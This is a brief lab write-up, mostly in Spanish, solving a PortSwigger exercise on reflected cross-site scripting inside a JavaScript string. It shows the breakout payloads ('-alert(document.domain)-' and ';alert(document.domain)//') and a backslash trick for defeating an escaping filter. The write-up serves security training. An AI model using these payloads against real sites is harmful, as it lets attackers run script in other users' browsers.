# Reflected XSS into a JavaScript string with angle brackets HTML encoded

> This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function

* Al intentar poner el clasico `<script>alert(a)</script>` se escribe lo siguiente encodeado al capturar la busqueda en el burp:
  * /?search=%3Cscript%3Ealert%28a%29%3C%2Fscript%3E
* Esto implica que nuestros &lt; &gt; son encodeados

Aca es cuando intentamos romper la secuencia de JS, ejecutandolo directamente en el contexto 

```text
'-alert(document.domain)-' 
';alert(document.domain)//
```

El laboratorio se soluciona buscando el primero: `'-alert(document.domain)-'` 

Algunas aplicaciones buscan romper la secuencia de JS escapando cualquier literal. Un backslash le dice al parser que un caracter debe ser interpretado literalmente y no como un caracter especial. Haciendo esto pude darse el caso que se pueda engañar al escapador dejando codigo interpretable:

Dado lo siguiente:

`';alert(document.domain)//`

Se convierte:

`\';alert(document.domain)//`

Se deja el siguiente payload:

`\';alert(document.domain)//`

Convertido a:

`\\';alert(document.domain)//`

El primer backslash \ significa que el segundo \ es un literal y no un caracter especial, esto marca el ' como un string terminator, dejando que el ataque funcione

